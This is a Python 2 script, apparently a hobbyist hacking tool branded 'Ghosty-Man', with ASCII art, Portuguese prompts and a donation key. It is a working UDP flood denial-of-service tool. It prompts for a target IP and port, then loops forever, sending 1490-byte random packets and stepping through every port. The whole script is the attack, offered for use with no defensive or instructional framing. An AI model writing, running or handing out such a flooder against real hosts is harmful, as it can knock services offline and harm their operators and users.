import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


os.system("clear")
os.system("figlet Ghosty-Man")
print("""
                     10101010
                 1010101110100101
               10101010101101010101
            011010101010110110010100101
           101      11010101      101010
           0          0101          10101
           0####      1010####      01101
         101####      0101####      1010101
         101####      1010####      1101010
         10101      10101011      101010101
         0111011010101010110110101010110101
         0101010101010101010101010101010110
         0101101101010101101010101010101101
         0101010101010100101010101010101101
         0010101011010110101010111010110101
         0110101011010110101011010101010101
         0101     10101      10101     1010
         101       0101      0101       010


""")
print
print "Criado por   : @GhostVoltz"
print "github   : https://github.com/GhostVoltz"
print "Me ajude a continuar criando conteudo"
print "com qualquer valor no PIX a baixo"
print "PIX : d6c33e84-a843-46f8-8ecc-8d43b86d76e7  "
print

ip = raw_input("IP do Alvo : ")
port = input("Porta       : ")

os.system("clear")
os.system("figlet 220V Neles ")
from tqdm import tqdm
for i in tqdm(range(10)):
    time.sleep(1)

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Enviando %s Mega/Voltz to %s pela porta:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

